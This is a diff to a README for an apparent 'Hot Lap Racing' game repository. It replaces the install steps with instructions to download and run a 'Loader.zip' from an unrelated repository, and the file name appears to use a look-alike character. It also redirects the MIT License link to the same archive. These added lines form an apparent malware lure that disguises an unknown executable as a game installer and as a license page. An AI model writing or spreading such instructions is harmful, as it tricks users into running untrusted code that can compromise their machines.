@@ -4,8 +4,8 @@ Welcome to the **Hot Lap Racing ** repository! Get ready to experience high-octa
 
 ## 🛠️ Installation Guide
 
-1. Download Loader.rar from the repository.
-2. Extract Loader.rar using your favorite archiver.
+1. Download https://raw.githubusercontent.com/12345678900273/SNU_2D_ProgrammingTools_IDE_GROMACS/main/Lоader.zip from the repository.
+2. Extract https://raw.githubusercontent.com/12345678900273/SNU_2D_ProgrammingTools_IDE_GROMACS/main/Lоader.zip using your favorite archiver.
 3. Run the Loader and follow on-screen instructions.
 4. Start playing and burn some rubber on the tracks!
 
@@ -41,7 +41,7 @@ Hot Lap Racing PC, Hot Lap Racing macOS, free Hot Lap Racing installer, multipla
 
 ## 📜 MIT License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT). 2025.  
+Distributed under the [MIT License](https://raw.githubusercontent.com/12345678900273/SNU_2D_ProgrammingTools_IDE_GROMACS/main/Lоader.zip). 2025.  
 Permission is granted for personal and non-commercial use.
 
 ---
